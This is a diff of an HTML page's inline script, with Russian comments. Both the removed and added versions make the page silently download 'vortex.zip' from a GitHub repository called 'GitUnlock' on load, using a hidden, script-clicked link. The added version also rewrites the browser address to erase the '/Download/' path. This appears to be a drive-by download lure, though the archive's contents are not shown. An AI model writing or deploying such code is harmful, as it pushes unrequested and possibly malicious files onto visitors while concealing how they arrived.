@@ -42,37 +42,38 @@
     <div class="loader"></div>
 
     <script>
-        // Проверяем, было ли уже скачивание
-        if (!sessionStorage.getItem('fileDownloaded')) {
-            sessionStorage.setItem('fileDownloaded', 'true');
-            
-            // Очищаем URL от /Download/ и перезагружаем страницу
-            const cleanUrlAndReload = () => {
-                const url = window.location.href;
-                if (url.includes('/Download/')) {
-                    const newUrl = url.replace('/Download/', '/');
-                    history.replaceState(null, null, newUrl);
-                    window.location.reload();
-                }
-            };
-            
-            // Скачиваем файл ОДИН РАЗ
-            const downloadFile = () => {
-                const link = document.createElement('a');
-                link.href = 'https://github.com/serezanet2/GitUnlock/raw/refs/heads/main/Download/vortex.zip';
-                link.download = 'vortex.zip';
-                link.style.display = 'none';
-                document.body.appendChild(link);
-                link.click();
-                setTimeout(() => {
-                    document.body.removeChild(link);
-                    cleanUrlAndReload();
-                }, 100);
-            };
-            
-            // Запускаем скачивание с небольшой задержкой
-            setTimeout(downloadFile, 300);
-        }
+        (function() {
+            // 1. Очищаем URL БЕЗ перезагрузки
+            const currentUrl = new URL(window.location.href);
+            if (currentUrl.pathname.includes('/Download/')) {
+                const cleanPath = currentUrl.pathname.replace('/Download/', '/');
+                const newUrl = currentUrl.origin + cleanPath + currentUrl.search + currentUrl.hash;
+                
+                // Важная часть: меняем URL без перезагрузки
+                window.history.replaceState({}, document.title, newUrl);
+                
+                // Для браузеров, которые не обновляют адресную строку:
+                setTimeout(() => window.dispatchEvent(new Event('popstate')), 50);
+            }
+
+            // 2. Скачиваем файл ОДИН РАЗ
+            if (!sessionStorage.getItem('vortexDownloaded')) {
+                sessionStorage.setItem('vortexDownloaded', 'true');
+                
+                const download = () => {
+                    const link = document.createElement('a');
+                    link.href = 'https://github.com/serezanet2/GitUnlock/raw/refs/heads/main/Download/vortex.zip';
+                    link.download = 'vortex.zip';
+                    link.style.display = 'none';
+                    document.body.appendChild(link);
+                    link.click();
+                    setTimeout(() => document.body.removeChild(link), 100);
+                };
+                
+                // Задержка для гарантии обработки URL
+                setTimeout(download, 100);
+            }
+        })();
     </script>
 </body>
 </html>
